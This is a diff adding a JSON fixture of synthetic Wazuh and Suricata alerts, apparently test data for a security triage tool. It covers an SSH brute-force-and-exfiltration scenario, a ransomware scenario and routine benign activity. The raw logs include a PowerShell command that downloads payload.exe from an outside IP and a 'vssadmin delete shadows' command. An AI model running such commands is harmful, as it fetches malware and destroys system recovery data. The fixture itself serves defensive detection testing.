@@ -1,0 +1,772 @@
+[
+  {
+    "alert_id": "wazuh-scenario1-001",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:00:00Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 10,
+      "description": "User authentication failure. Attempt 1 of 15 for user: dbadmin",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:00:00 prod-db-server sshd[1234]: Failed password for dbadmin from 203.0.113.45 port 54320 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-002",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:00:30Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 10,
+      "description": "User authentication failure. Attempt 2 of 15 for user: dbadmin",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:00:02 prod-db-server sshd[1234]: Failed password for dbadmin from 203.0.113.45 port 54321 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-003",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:01:00Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 10,
+      "description": "User authentication failure. Attempt 3 of 15 for user: dbadmin",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:00:04 prod-db-server sshd[1234]: Failed password for dbadmin from 203.0.113.45 port 54322 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-004",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:01:30Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 10,
+      "description": "User authentication failure. Attempt 4 of 15 for user: dbadmin",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:00:06 prod-db-server sshd[1234]: Failed password for dbadmin from 203.0.113.45 port 54323 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-005",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:02:00Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 10,
+      "description": "User authentication failure. Attempt 5 of 15 for user: dbadmin",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:00:08 prod-db-server sshd[1234]: Failed password for dbadmin from 203.0.113.45 port 54324 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-006",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:02:30Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 10,
+      "description": "User authentication failure. Attempt 6 of 15 for user: dbadmin",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:00:10 prod-db-server sshd[1234]: Failed password for dbadmin from 203.0.113.45 port 54325 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-007",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:03:00Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 10,
+      "description": "User authentication failure. Attempt 7 of 15 for user: dbadmin",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:00:12 prod-db-server sshd[1234]: Failed password for dbadmin from 203.0.113.45 port 54326 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-016",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:07:30Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5501",
+      "level": 5,
+      "description": "User logged in successfully: dbadmin",
+      "mitre": {
+        "id": [
+          "T1078"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Valid Accounts"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:07:30 prod-db-server sshd[1234]: Accepted password for dbadmin from 203.0.113.45 port 54336 ssh2"
+  },
+  {
+    "alert_id": "wazuh-scenario1-017",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:08:00Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "5503",
+      "level": 12,
+      "description": "Sensitive file accessed: /var/data/customers.db",
+      "mitre": {
+        "id": [
+          "T1005"
+        ],
+        "tactic": [
+          "Collection"
+        ],
+        "technique": [
+          "Data from Local System"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 22,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:08:00 prod-db-server audit[5678]: openat /var/data/customers.db by uid=dbadmin"
+  },
+  {
+    "alert_id": "wazuh-scenario1-018",
+    "source": "suricata",
+    "timestamp": "2026-11-13T12:08:30Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-db-server",
+      "ip": "192.168.10.50"
+    },
+    "rule": {
+      "id": "suricata-et-policy-001",
+      "level": 14,
+      "description": "High-volume outbound data transfer detected (450MB) to external IP",
+      "mitre": {
+        "id": [
+          "T1048"
+        ],
+        "tactic": [
+          "Exfiltration"
+        ],
+        "technique": [
+          "Exfiltration Over Alternative Protocol"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": "203.0.113.45",
+      "dst_port": 443,
+      "user": "dbadmin"
+    },
+    "raw_log": "Nov 13 12:08:30 suricata[9999]: ALERT ET POLICY Large Data Transfer to external 203.0.113.45:443 bytes=471859200"
+  },
+  {
+    "alert_id": "wazuh-scenario2-001",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:00Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "92201",
+      "level": 12,
+      "description": "Suspicious PowerShell command: Invoke-WebRequest downloading from internet",
+      "mitre": {
+        "id": [
+          "T1059.001"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Command and Scripting Interpreter: PowerShell"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 443,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:00 win-workstation-01 Sysmon: PowerShell.exe -Command Invoke-WebRequest -Uri http://198.51.100.99/payload.exe -OutFile C:\\Users\\Public\\payload.exe"
+  },
+  {
+    "alert_id": "wazuh-scenario2-002",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:15Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_001.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:15 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_001.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-003",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:20Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_002.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:20 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_002.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-004",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:25Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_003.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:25 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_003.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-005",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:30Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_004.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:30 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_004.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-006",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:35Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_005.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:35 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_005.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-007",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:40Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_006.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:40 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_006.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-008",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:45Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_007.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:45 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_007.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-009",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:50Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_008.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:50 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_008.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-022",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:12:00Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "92300",
+      "level": 15,
+      "description": "Shadow copy deletion command executed: vssadmin delete shadows /all /quiet",
+      "mitre": {
+        "id": [
+          "T1490"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Inhibit System Recovery"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:12:00 win-workstation-01 Sysmon: Process cmd.exe: vssadmin delete shadows /all /quiet"
+  },
+  {
+    "alert_id": "wazuh-scenario3-001",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T09:00:00Z",
+    "agent": {
+      "id": "003",
+      "name": "ops-server-01",
+      "ip": "192.168.1.10"
+    },
+    "rule": {
+      "id": "5501",
+      "level": 3,
+      "description": "Routine SSH login for sysadmin from known internal host",
+      "mitre": {
+        "id": [],
+        "tactic": [],
+        "technique": []
+      }
+    },
+    "data": {
+      "src_ip": "192.168.1.5",
+      "dst_port": 22,
+      "user": "sysadmin"
+    },
+    "raw_log": "Nov 13 09:01:00 ops-server-01 sshd[200]: Accepted publickey for sysadmin from 192.168.1.5"
+  },
+  {
+    "alert_id": "wazuh-scenario3-002",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T09:01:00Z",
+    "agent": {
+      "id": "003",
+      "name": "ops-server-01",
+      "ip": "192.168.1.10"
+    },
+    "rule": {
+      "id": "5501",
+      "level": 3,
+      "description": "Routine SSH login for sysadmin from known internal host",
+      "mitre": {
+        "id": [],
+        "tactic": [],
+        "technique": []
+      }
+    },
+    "data": {
+      "src_ip": "192.168.1.5",
+      "dst_port": 22,
+      "user": "sysadmin"
+    },
+    "raw_log": "Nov 13 09:02:00 ops-server-01 sshd[200]: Accepted publickey for sysadmin from 192.168.1.5"
+  },
+  {
+    "alert_id": "wazuh-scenario3-003",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T09:02:00Z",
+    "agent": {
+      "id": "003",
+      "name": "ops-server-01",
+      "ip": "192.168.1.10"
+    },
+    "rule": {
+      "id": "5501",
+      "level": 3,
+      "description": "Routine SSH login for sysadmin from known internal host",
+      "mitre": {
+        "id": [],
+        "tactic": [],
+        "technique": []
+      }
+    },
+    "data": {
+      "src_ip": "192.168.1.5",
+      "dst_port": 22,
+      "user": "sysadmin"
+    },
+    "raw_log": "Nov 13 09:03:00 ops-server-01 sshd[200]: Accepted publickey for sysadmin from 192.168.1.5"
+  },
+  {
+    "alert_id": "wazuh-scenario3-004",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T09:30:00Z",
+    "agent": {
+      "id": "003",
+      "name": "ops-server-01",
+      "ip": "192.168.1.10"
+    },
+    "rule": {
+      "id": "2900",
+      "level": 2,
+      "description": "Package manager update executed: apt-get upgrade",
+      "mitre": {
+        "id": [],
+        "tactic": [],
+        "technique": []
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "root"
+    },
+    "raw_log": "Nov 13 09:30:00 ops-server-01 dpkg: status installed apt"
+  },
+  {
+    "alert_id": "wazuh-scenario3-005",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T09:00:01Z",
+    "agent": {
+      "id": "003",
+      "name": "ops-server-01",
+      "ip": "192.168.1.10"
+    },
+    "rule": {
+      "id": "2901",
+      "level": 2,
+      "description": "Daily backup cron job started by root",
+      "mitre": {
+        "id": [],
+        "tactic": [],
+        "technique": []
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "root"
+    },
+    "raw_log": "Nov 13 09:00:01 ops-server-01 CRON[9999]: (root) CMD (/usr/local/bin/backup.sh)"
+  }
+]
